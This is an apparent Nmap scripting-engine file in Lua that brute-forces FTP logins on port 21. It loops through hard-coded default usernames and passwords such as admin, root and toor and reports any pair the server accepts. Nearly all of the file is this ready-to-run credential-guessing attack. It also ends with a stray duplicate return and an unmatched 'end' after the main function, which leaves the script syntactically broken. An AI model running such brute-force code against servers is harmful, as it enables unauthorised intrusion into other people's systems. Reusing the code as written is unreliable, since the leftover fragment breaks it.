description = [[
    attempts to brute force an FTP server with a list of credentials
]]

author = "Asko7779"
license = "Same as Nmap"
categories = {"brute", "intrusive"}

portrule = function(host, port)
    return port.number == 21 and port.state == "open"
end

action = function(host, port)
    local usernames = {"admin", "root", "guest", "anonymous", "ftp"}
    local passwords = {"admin", "toor", "guest", "1234", "ftp"}

    for _, user in ipairs(usernames) do
        for _, pass in ipairs(passwords) do
            local socket = nmap.new_socket()
            local success, err = socket:connect(host.ip, port.number)
            if not success then
                return "Error connecting to the server: " .. err
            end
            socket:send("USER " .. user .. "\r\n")
            local response = socket:receive()
            if not response then
                socket:close()
                return "Error receiving response after USER command"
            end
            stdnse.print_debug("Trying: " .. user .. " / " .. pass)
            socket:send("PASS " .. pass .. "\r\n")
            response = socket:receive()
            socket:close()
            if response and response:match("230") then
                return "Valid credentials found: " .. user .. " / " .. pass
            end
        end
    end
    return "No valid credentials found"
end

    return "[-] Brute force attempt unsuccessful"
end
